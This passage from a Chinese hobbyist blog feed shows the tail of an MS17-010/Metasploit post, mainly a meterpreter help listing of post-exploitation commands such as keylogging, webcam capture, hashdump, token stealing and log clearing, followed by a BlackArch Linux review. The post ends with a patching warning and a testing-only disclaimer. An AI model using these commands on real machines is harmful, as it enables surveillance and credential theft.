</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; <span class="nb">help</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就可以看到帮助文档了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Core Commands
</span></span><span class="line"><span class="cl">=============
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command                   Description
</span></span><span class="line"><span class="cl">    -------                   -----------
</span></span><span class="line"><span class="cl">    ?                         Help menu
</span></span><span class="line"><span class="cl">    background                Backgrounds the current session
</span></span><span class="line"><span class="cl">    bg                        Alias for background
</span></span><span class="line"><span class="cl">    bgkill                    Kills a background meterpreter script
</span></span><span class="line"><span class="cl">    bglist                    Lists running background scripts
</span></span><span class="line"><span class="cl">    bgrun                     Executes a meterpreter script as a background thread
</span></span><span class="line"><span class="cl">    channel                   Displays information or control active channels
</span></span><span class="line"><span class="cl">    close                     Closes a channel
</span></span><span class="line"><span class="cl">    disable_unicode_encoding  Disables encoding of unicode strings
</span></span><span class="line"><span class="cl">    enable_unicode_encoding   Enables encoding of unicode strings
</span></span><span class="line"><span class="cl">    exit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    get_timeouts              Get the current session timeout values
</span></span><span class="line"><span class="cl">    guid                      Get the session GUID
</span></span><span class="line"><span class="cl">    help                      Help menu
</span></span><span class="line"><span class="cl">    info                      Displays information about a Post module
</span></span><span class="line"><span class="cl">    irb                       Open an interactive Ruby shell on the current session
</span></span><span class="line"><span class="cl">    load                      Load one or more meterpreter extensions
</span></span><span class="line"><span class="cl">    machine_id                Get the MSF ID of the machine attached to the session
</span></span><span class="line"><span class="cl">    migrate                   Migrate the server to another process
</span></span><span class="line"><span class="cl">    pivot                     Manage pivot listeners
</span></span><span class="line"><span class="cl">    pry                       Open the Pry debugger on the current session
</span></span><span class="line"><span class="cl">    quit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    read                      Reads data from a channel
</span></span><span class="line"><span class="cl">    resource                  Run the commands stored in a file
</span></span><span class="line"><span class="cl">    run                       Executes a meterpreter script or Post module
</span></span><span class="line"><span class="cl">    sessions                  Quickly switch to another session
</span></span><span class="line"><span class="cl">    set_timeouts              Set the current session timeout values
</span></span><span class="line"><span class="cl">    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span></span><span class="line"><span class="cl">    transport                 Change the current transport mechanism
</span></span><span class="line"><span class="cl">    use                       Deprecated alias for &#34;load&#34;
</span></span><span class="line"><span class="cl">    uuid                      Get the UUID for the current session
</span></span><span class="line"><span class="cl">    write                     Writes data to a channel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: File system Commands
</span></span><span class="line"><span class="cl">============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    cat           Read the contents of a file to the screen
</span></span><span class="line"><span class="cl">    cd            Change directory
</span></span><span class="line"><span class="cl">    checksum      Retrieve the checksum of a file
</span></span><span class="line"><span class="cl">    cp            Copy source to destination
</span></span><span class="line"><span class="cl">    dir           List files (alias for ls)
</span></span><span class="line"><span class="cl">    download      Download a file or directory
</span></span><span class="line"><span class="cl">    edit          Edit a file
</span></span><span class="line"><span class="cl">    getlwd        Print local working directory
</span></span><span class="line"><span class="cl">    getwd         Print working directory
</span></span><span class="line"><span class="cl">    lcd           Change local working directory
</span></span><span class="line"><span class="cl">    lls           List local files
</span></span><span class="line"><span class="cl">    lpwd          Print local working directory
</span></span><span class="line"><span class="cl">    ls            List files
</span></span><span class="line"><span class="cl">    mkdir         Make directory
</span></span><span class="line"><span class="cl">    mv            Move source to destination
</span></span><span class="line"><span class="cl">    pwd           Print working directory
</span></span><span class="line"><span class="cl">    rm            Delete the specified file
</span></span><span class="line"><span class="cl">    rmdir         Remove directory
</span></span><span class="line"><span class="cl">    search        Search for files
</span></span><span class="line"><span class="cl">    show_mount    List all mount points/logical drives
</span></span><span class="line"><span class="cl">    upload        Upload a file or directory
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Networking Commands
</span></span><span class="line"><span class="cl">===========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    arp           Display the host ARP cache
</span></span><span class="line"><span class="cl">    getproxy      Display the current proxy configuration
</span></span><span class="line"><span class="cl">    ifconfig      Display interfaces
</span></span><span class="line"><span class="cl">    ipconfig      Display interfaces
</span></span><span class="line"><span class="cl">    netstat       Display the network connections
</span></span><span class="line"><span class="cl">    portfwd       Forward a local port to a remote service
</span></span><span class="line"><span class="cl">    resolve       Resolve a set of host names on the target
</span></span><span class="line"><span class="cl">    route         View and modify the routing table
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: System Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    clearev       Clear the event log
</span></span><span class="line"><span class="cl">    drop_token    Relinquishes any active impersonation token.
</span></span><span class="line"><span class="cl">    execute       Execute a command
</span></span><span class="line"><span class="cl">    getenv        Get one or more environment variable values
</span></span><span class="line"><span class="cl">    getpid        Get the current process identifier
</span></span><span class="line"><span class="cl">    getprivs      Attempt to enable all privileges available to the current process
</span></span><span class="line"><span class="cl">    getsid        Get the SID of the user that the server is running as
</span></span><span class="line"><span class="cl">    getuid        Get the user that the server is running as
</span></span><span class="line"><span class="cl">    kill          Terminate a process
</span></span><span class="line"><span class="cl">    localtime     Displays the target system&#39;s local date and time
</span></span><span class="line"><span class="cl">    pgrep         Filter processes by name
</span></span><span class="line"><span class="cl">    pkill         Terminate processes by name
</span></span><span class="line"><span class="cl">    ps            List running processes
</span></span><span class="line"><span class="cl">    reboot        Reboots the remote computer
</span></span><span class="line"><span class="cl">    reg           Modify and interact with the remote registry
</span></span><span class="line"><span class="cl">    rev2self      Calls RevertToSelf() on the remote machine
</span></span><span class="line"><span class="cl">    shell         Drop into a system command shell
</span></span><span class="line"><span class="cl">    shutdown      Shuts down the remote computer
</span></span><span class="line"><span class="cl">    steal_token   Attempts to steal an impersonation token from the target process
</span></span><span class="line"><span class="cl">    suspend       Suspends or resumes a list of processes
</span></span><span class="line"><span class="cl">    sysinfo       Gets information about the remote system, such as OS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: User interface Commands
</span></span><span class="line"><span class="cl">===============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    enumdesktops   List all accessible desktops and window stations
</span></span><span class="line"><span class="cl">    getdesktop     Get the current meterpreter desktop
</span></span><span class="line"><span class="cl">    idletime       Returns the number of seconds the remote user has been idle
</span></span><span class="line"><span class="cl">    keyboard_send  Send keystrokes
</span></span><span class="line"><span class="cl">    keyscan_dump   Dump the keystroke buffer
</span></span><span class="line"><span class="cl">    keyscan_start  Start capturing keystrokes
</span></span><span class="line"><span class="cl">    keyscan_stop   Stop capturing keystrokes
</span></span><span class="line"><span class="cl">    mouse          Send mouse events
</span></span><span class="line"><span class="cl">    screenshot     Grab a screenshot of the interactive desktop
</span></span><span class="line"><span class="cl">    setdesktop     Change the meterpreters current desktop
</span></span><span class="line"><span class="cl">    uictl          Control some of the user interface components
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Webcam Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    record_mic     Record audio from the default microphone for X seconds
</span></span><span class="line"><span class="cl">    webcam_chat    Start a video chat
</span></span><span class="line"><span class="cl">    webcam_list    List webcams
</span></span><span class="line"><span class="cl">    webcam_snap    Take a snapshot from the specified webcam
</span></span><span class="line"><span class="cl">    webcam_stream  Play a video stream from the specified webcam
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Audio Output Commands
</span></span><span class="line"><span class="cl">=============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    play          play an audio file on target system, nothing written on disk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Elevate Commands
</span></span><span class="line"><span class="cl">======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    getsystem     Attempt to elevate your privilege to that of local system.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Password database Commands
</span></span><span class="line"><span class="cl">================================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    hashdump      Dumps the contents of the SAM database
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Timestomp Commands
</span></span><span class="line"><span class="cl">========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    timestomp     Manipulate file MACE attributes
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，返回来的很多是吧，这几个比较常用</p>
<p><strong><code>cd</code></strong>、<strong><code>ls</code></strong>、<strong><code>shell</code></strong>、<strong><code>cat</code></strong></p>
<p>懂Linux的人基本上都知道了，这里不多做解释了。</p>
<h2 id="小结">小结</h2>
<p>首先本篇博客仅作为测试用途，请勿将其用于违法用途。</p>
<p>其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。</p>
<p>然后这篇博客也带有很多水的成分，谢谢浏览。</p>
]]></description>
</item><item>
    <title>关于BlackArch的体验报告</title>
    <link>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</link>
    <pubDate>Sun, 16 Jun 2019 16:33:47 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/ba-slider.png" referrerpolicy="no-referrer">
            </div><blockquote>
<p><em>今天我尝试装了一下black Arch，花了很长时间，之后发现这个系统并不是很完美。</em></p>
</blockquote>
<h2 id="优点">优点</h2>
<p>首先说说它的优点:</p>
<ul>
<li>这玩意集成了几千个软件包，并且都是一些很厉害的工具</li>
<li>其次这玩意很酷，特别是壁纸，配色什么的，我都觉得特别炫酷</li>
<li>以及它安装的便捷性，我一开始以为它比Arch难安装，其实用完才知道这个安装简直比Arch简单十倍，只不过我习惯了Arch那种手动式，这种半自动化却不习惯了</li>
</ul>
<h2 id="缺点">缺点</h2>
<p>现在来说说缺点:</p>
<ul>
<li>首先ISO实在是太大了，Black Arch官方的live ISO达到了12GB，我idm都下载了很久，而网络安装包和Arch的大小一样，不过我没试过</li>
<li>更可怕的是 blackarch官方镜像的安装最低硬盘需求达到了40GB以上，这使得大部分人缺乏这个安装条件</li>
<li>其次就是它的桌面环境实在太简陋了，而且性能上也特别不好，特别是i3和spectrwm这两个，根本无法操作，fluxbox最炫酷但是习惯太不适合大部分人了，openbox啥都没有，更不好操作，而且不支持中文，弄得我很蛋疼；还有就是依赖太乱了，换别的桌面环境很麻烦，比如我想卸载掉其他的换xfce，结果pacman -Rs卸载不了，得用Rsc才能卸载，结果把lxdm给卸掉了，进不去图形了，后来装上lxdm出现了很大的颜色bug。。。</li>
</ul>
<h2 id="总结">总结</h2>
<p>首先不能否认BlackArch是装逼的好东西，但是我不推荐使用官方的镜像（无论是在线镜像还是离线live）去安装，否则就会有我的下场了，其次就是用户必须有Arch系基础，否则就是个坑。建议先安装Arch，然后导入BlackArch的软件库安装全套工具即可。最后请不要那blackarch与kali、parrot对比，这没有对比性的，工具都差不多的。</p>
]]></description>
</item></channel>
</rss>
